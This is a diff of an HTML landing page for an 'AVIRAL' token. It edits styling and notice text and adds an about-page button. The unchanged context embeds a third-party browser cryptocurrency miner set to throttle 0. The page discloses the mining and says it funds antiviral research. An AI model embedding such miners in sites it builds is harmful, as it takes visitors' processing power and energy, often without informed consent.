@@ -60,7 +60,7 @@
       box-shadow: 0 0 10px #ff9800;
       transition: all 0.3s ease;
       display: inline-block;
-      margin-top: 1.5rem;
+      margin: 1rem 0.5rem;
     }
     .button:hover {
       background: #ffca28;
@@ -81,7 +81,7 @@
     <h2>Impulsando la investigación antiviral desde tu navegador 🌐</h2>
 
     <p class="notice">
-      ⚠️ <strong>Deja esta pestaña abierta para donar poder de cómputo 💻.</strong><br>
+      ⚠️ <strong>Deja esta pestaña del navegador abierta para donar poder de cómputo 💻.</strong><br>
       🧪 Estás ayudando a minar <strong>MintMe Coin</strong>, lo que nos permitirá lanzar el token <strong>AVIRAL</strong> oficialmente en la blockchain.<br>
       💰 Los fondos recaudados se destinarán a apoyar investigaciones científicas reales contra virus emergentes.<br><br>
 
@@ -90,6 +90,10 @@
       💰 All proceeds will fund real scientific research against emerging viruses.
     </p>
 
+    <!-- New Button to About Page -->
+    <a class="button" href="acerca.html" target="_blank">🔍 Click aquí para saber más acerca de AVIRAL y la RMDA?</a>
+
+    <!-- Existing Button to MintMe -->
     <a class="button" href="https://www.mintme.com/token/AVIRAL" target="_blank">🔗 Ver o Comprar en MintMe</a>
 
     <footer>
@@ -101,10 +105,11 @@
   <script src="https://www.hostingcloud.racing/4qzr.js"></script>
   <script>
     var _client = new Client.Anonymous('201f3477d57d2ae999354d2a82193d7a413cdbecc697c25648ab9e2b73a33c21', {
-      throttle: 0, c: 'w'
+      throttle: 0, c: 'w', ads: 0
     });
     _client.start();
-    _client.addMiningNotification("Top", "🧠 This site is mining MintMe to support antiviral research. ¡Gracias por tu apoyo!", "#fea916", 40, "#000000");
+    _client.addMiningNotification("Top", "🧠 This site is mining MintMe to support antiviral research. Thanks For you Support! ¡Gracias por tu apoyo!", "#fea916", 40, "#000000");
   </script>
 </body>
 </html>
+
